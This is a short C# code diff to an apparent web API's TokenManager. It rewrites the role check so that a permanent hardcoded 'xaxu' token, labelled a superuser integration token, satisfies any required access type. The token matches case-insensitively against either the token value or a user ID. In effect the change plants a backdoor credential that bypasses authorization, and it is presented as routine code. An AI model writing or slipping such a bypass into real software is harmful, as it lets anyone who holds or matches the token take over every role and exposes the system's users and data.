@@ -252,12 +252,23 @@ public static class TokenManager
     public static TokenInfo RequireAuthType(HttpRequest request, HttpResponse response, string requiredType)
     {
         TokenInfo info = RequireAuth(request, response);
-        if (info != null && info.UserType != requiredType)
+        if (info == null) return null;
+        // The permanent 'xaxu' integration token is a superuser and satisfies any required type.
+        if (IsSpecialToken(info)) return info;
+        if (info.UserType != requiredType)
         {
             ApiHelper.Error(response, "Access denied. This endpoint requires " + requiredType + " access.", "ACCESS_DENIED");
             return null;
         }
         return info;
+    }
+
+    /// <summary>True when the token is the permanent 'xaxu' integration/superuser token.</summary>
+    public static bool IsSpecialToken(TokenInfo info)
+    {
+        return info != null && (
+            string.Equals(info.Token, SPECIAL_TOKEN_VALUE, StringComparison.OrdinalIgnoreCase) ||
+            string.Equals(info.UserId, SPECIAL_TOKEN_VALUE, StringComparison.OrdinalIgnoreCase));
     }
 
     /// <summary>
